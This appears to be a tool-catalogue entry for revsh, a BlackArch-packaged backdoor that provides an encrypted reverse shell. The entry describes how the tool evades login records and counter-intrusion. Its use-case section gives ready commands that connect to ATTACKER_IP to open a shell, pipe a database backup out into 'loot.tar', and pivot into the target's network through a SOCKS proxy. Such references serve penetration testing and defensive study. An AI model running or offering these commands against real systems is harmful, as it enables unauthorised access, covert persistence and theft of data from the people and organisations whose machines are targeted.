---
name: "revsh"
categories:
  - blackarch-backdoor
version: "215.174e309"
homepage: "https://github.com/emptymonkey/revsh/"
packaged-by: [blackarch]
blackarch-builddate: "2017-01-09"
build-system: make
license: MIT
meta-checked: "2026-11-09"
github-repo: "emptymonkey/revsh"
github-stars: 470
github-pushed: "2024-07-10"
github-archived: false
github-issues: 11
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# revsh

> Encrypted reverse shell with genuine terminal support, plus file transfer, SOCKS proxies and reverse-VPN pivoting.

## What it's for

revsh (emptymonkey) makes reverse shells behave like real logins: both ends mediate the connection through pseudo-terminals, so job control, Ctrl-C, tab completion, window-resize events and tty-requiring programs like vi all work — exactly the things netcat one-liner shells break. Traffic is OpenSSL-encrypted with key-based authentication baked in at build time: ephemeral Diffie-Hellman with perfect forward secrecy by default, anonymous DH on request, and cert pinning that protects against sinkholes and MITM counter-intrusion; utmp/wtmp are circumvented so no login is recorded, and the target can retry on randomized timers. Beyond the interactive shell it brokers data netcat-style for file transfer (`-n`), does static (`-L`/`-R`) and dynamic SOCKS 4/4a/5 (`-D`) forwarding in both directions, and can attach tun/tap devices at both ends for a reverse VPN that gives the operator a routable address on the target's network. The operator side is `revsh -c`, listening on port 2200 by default; the target runs plain `revsh <operator-address>[:port]`.

## Typical use cases

### Get a fully interactive encrypted reverse shell

```
revsh -c
revsh ATTACKER_IP
```

Outcome: the target connects out to the operator's control listener on port 2200 and serves `/bin/bash` over an encrypted, pty-backed session — history, job control and vi work at the operator's terminal; connection keys live in `~/.revsh/keys/` (relocatable with `-d`).

### Serve a bind shell instead

```
revsh -b
revsh -c -b 198.51.100.10
```

Outcome: the same encrypted terminal session with the direction flipped — the target listens (`-b`, required on both ends; invoking the binary as `bindsh` implies it) and the operator connects in.

### Pull a file back over the channel

```
revsh -c -n > loot.tar
cat /var/backups/db.tar | revsh ATTACKER_IP
```

Outcome: non-interactive netcat-style brokering (`-n`, no tty) streams the target-side file through the encrypted tunnel into the operator's `loot.tar`; pushing a file out is the mirror image — pipe it into `revsh -c -n` on the operator and redirect to a file on the target.

### Pivot through the target with a dynamic SOCKS proxy

```
revsh -c -D 1080
revsh ATTACKER_IP
```

Outcome: a SOCKS 4/4a/5 endpoint on the operator at 127.0.0.1:1080 whose TCP connections egress from the target's network — point proxychains or any SOCKS-aware tool at it to reach hosts visible only to the target.

*No corpus evidence — derived from upstream documentation.*
